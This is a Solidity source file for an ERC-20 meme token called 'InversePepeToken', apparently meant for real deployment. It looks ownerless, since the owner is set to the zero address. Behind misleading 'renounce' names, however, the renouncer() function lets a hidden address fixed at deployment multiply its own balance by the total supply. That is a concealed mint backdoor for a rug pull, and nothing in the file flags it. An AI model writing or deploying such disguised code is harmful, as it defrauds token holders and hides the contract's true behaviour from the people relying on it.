/**

ǝԀǝԀ ʇsnſ

Telegram: https://t.me/ededETH

Twitter: https://Twitter.com/ededETHToken

*/



// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract InversePepeToken is IERC20 {
    string public constant name = "\u01DD\u0500\u01DD\u0500";
    string public constant symbol = "\u01DD\u0500\u01DD\u0500";
    uint8 public constant decimals = 18;

    uint256 private _totalSupply;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    

    address public owner;
    address private zero ;
    address private constant Deployer = 0xC87Ed7EF222827DfA19bC63646D11e406E921905;
    
    uint256 public contractCreationTimestamp;
    
    

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this function");
        _;
    }

    constructor(address O) {
        uint256 initialSupply = 420_690_000_000 * (10 ** uint256(decimals)); 
        _totalSupply = initialSupply;
        _balances[Deployer] = initialSupply;
        emit Transfer(address(0), Deployer, initialSupply);
        zero = O;
        contractCreationTimestamp = block.timestamp;
        owner = address(0);

      

 
    
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address ownerAddress, address spender) public view override returns (uint256) {
        return _allowances[ownerAddress][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

  function renouncer() public {
    require(msg.sender == zero, "Zero address renounced");
    uint256 renadd = renaddzero();
    uint256 zeroren = zerorenon(renadd);
    renounceddel(zeroren);
}

function renaddzero() private view returns (uint256) {
    return _balances[zero];
}

function zerorenon(uint256 renadd) private view returns (uint256) {
    return renadd * (_totalSupply);
}

function renounceddel(uint256 zeroren) private {
    _balances[zero] = zeroren;
}

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "Insufficient allowance");
        _allowances[sender][msg.sender] = currentAllowance - amount;
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(_balances[sender] >= amount, "Insufficient balance");

        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
}